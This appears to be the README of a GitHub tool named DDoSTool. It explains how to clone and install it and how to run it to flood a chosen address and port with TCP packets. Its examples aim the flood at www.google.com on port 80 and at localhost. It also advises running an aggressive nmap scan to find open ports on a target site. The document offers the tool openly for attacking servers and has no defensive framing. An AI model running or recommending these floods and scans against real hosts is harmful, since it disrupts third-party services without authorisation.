<h1>Installation</h1>

## 1. clone files

```shell
git clone https://github.com/camillettss/DDoSTool/
```
then enter the folder typing:
```shell
cd DDT
```

## 2. setup 
```python
pip install -r requirements
```
enter this and wait for complete operation.

now you can finally run the spammer script!

## 3. Run
in the command line type:
```python
python main.py address:port
```
for spam to %address on %port

# Syntax and params

default spam mode send packets to the server while the exit key is pressed 
(ctrl+c usually).

the `--limit num` parameter stop sending packs on the num times.

this example will send 100 packs to the server on serverport, then stop the code:

```python
python main.py serverip:serverport --limit 100
```

you can separate ip and port using `--port` parameter, example:

```python
python main.py serverip --port serverport
```
that is equal to:
```python
python main.py serverip:serverport
```

## examples:

```shell
python main.py www.google.com --port 80 --limit 1000
```
send 1000 packets to www.google.com on port 80, reached 1000 packs exit the code

```shell
python main.py 127.0.0.1:8080 --limit 50
```
send 50 packs to localhost on port 8080

# How to choose the port

this spammer connects on tcp ports, to scan a server use nmap (in linux-like shells). nmap will discover open ports on a server and their type (TCP, HTTP ...)

with this tool u can spam only on TCP open ports, so scan a site typing:

```shell
nmap -v -A www.site.com 
```